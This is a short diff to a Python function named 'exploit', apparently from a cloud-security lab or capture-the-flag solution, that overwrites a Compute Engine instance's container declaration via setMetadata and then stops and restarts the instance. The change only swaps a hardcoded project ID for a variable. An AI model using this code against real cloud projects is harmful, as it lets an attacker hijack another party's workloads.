@@ -197,11 +197,11 @@ def exploit(nonce, logging_key):
   '''
     fingerprint = api_instance['metadata']['fingerprint']
     payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
-    compute_api.instances().setMetadata(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine', body=payload).execute()
-    compute_api.instances().stop(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()
+    compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
         time.sleep(2)
-    compute_api.instances().start(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
         time.sleep(2)
     shutil.rmtree(temp_dir)
